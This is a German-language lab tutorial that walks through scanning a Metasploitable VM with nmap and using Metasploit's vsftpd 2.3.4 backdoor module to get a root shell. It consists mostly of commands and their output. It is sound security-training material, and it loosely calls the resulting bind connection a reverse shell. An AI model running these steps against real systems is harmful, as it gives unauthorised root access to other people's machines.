# FTP exploit (Kali Linux + Metasploitable)
#ITP 
Um zu erfahren, wie ein bestimmtes Netzwerk aufgebaut ist, kann `nmap <Netzwerk>` verwendet werden, um alle Hosts im angegebenen Netzwerk zu entdecken. Dies ermöglicht es uns, einen ausgewählten Host ins Visier zu nehmen.

Demonetzwerk scannen (unter Verwendung eines NAT-Netzwerks und zweier virtueller Maschinen):
```
nmap 10.0.2.0/24
```
Dieser Befehl listet alle Hosts in einem Netzwerk auf. Wir wählen `10.0.2.4` als unser Ziel aus.

Wie man einen Host auf bestimmte laufende Anwendungen scannt:
```bash
# the `sV` option adds the version of the service running.
# the `p` option contains a port range that is scanned.
nmap -sV -p 1-1000 10.0.2.4
```
Dies listet alle TCP- oder UDP-Anwendungen auf, die auf dem Ziel ausgeführt werden. Die Daten enthalten den Port, ob die Anwendung zugänglich ist, den Namen und die Version der Anwendung.

Hier ist ein Beispiel:
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p 1-1000 10.0.2.4
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-14 09:31 EDT
Nmap scan report for 10.0.2.4
Host is up (0.00046s latency).
Not shown: 988 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp  open  telnet      Linux telnetd
25/tcp  open  smtp        Postfix smtpd
53/tcp  open  domain      ISC BIND 9.4.2
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp open  rpcbind     2 (RPC #100000)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp open  exec        netkit-rsh rexecd
513/tcp open  login       OpenBSD or Solaris rlogind
514/tcp open  tcpwrapped
Service Info: Host:  metasploitable.localdomain; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```
Es laufen mehrere interessante (veraltete) Versionen bekannter Anwendungen. Die erste Anwendung ist bereits anfällig. Es handelt sich um einen FTP-Dienst der Version 2.3.4, der eine bekannte Schwachstelle aufweist. Das Metasploit-Framework bietet einen Exploit, der verwendet werden kann, um eine Reverse-Shell auf dem Host mit dieser verwundbaren Version von FTP zu erstellen.

So starten Sie das Metasploit-Framework:
```bash
msfconsole
```

Um eine bestimmte Version von FTP (2.3.4) zu exploitieren, müssen wir zunächst die vorhandenen Exploits im Metasploit-Framework ermitteln. Hierfür können wir den Befehl `search <Service> <Version>` verwenden.
```bash
search vsftpd 2.3.4

msf6 > search vsftpd 2.3.4

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor

```
Wie bereits erwähnt, ist diese Version von FTP angreifbar und gibt einen verwendbaren Exploit zurück.

So verwenden Sie diesen Exploit:
```
use exploit/unix/ftp/vsftpd_234_backdoor
```
Bevor wir jedoch fortfahren können, müssen wir den Host festlegen, der vom Exploit angegriffen werden soll.

Um zu überprüfen, ob der Host nicht festgelegt wurde, können Sie den Befehl `show options` eingeben. Dies zeigt mehrere Variablen an, wobei die Variable `RHOSTS` die Ziele enthält.
```bash
show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)

```

Wir müssen das Zielhost über `RHOSTS` angeben!! (10.0.2.4) Die Variable wird über den Befehl `set <Variable> <Wert>` festgelegt.
```
set RHOSTS 10.0.2.4
```
Um mit dem Exploiting zu beginnen, wird der Befehl `exploit` eingegeben.
```
exploit
```

Wir haben erfolgreich `msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit` durchgeführt.

```bash
[*] 10.0.2.4:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.0.2.4:21 - USER: 331 Please specify the password.
[+] 10.0.2.4:21 - Backdoor service has been spawned, handling...
[+] 10.0.2.4:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (10.0.2.15:34955 -> 10.0.2.4:6200) at 2023-09-14 09:42:08 -0400
```

Nach Eingabe dieses Befehls wird eine Reverse-Shell geöffnet.
Sie können überprüfen, ob dies funktioniert hat, indem Sie den Befehl `whoami` eingeben, der möglicherweise "root" ausgibt (daher haben Sie vollen Zugriff auf das System).

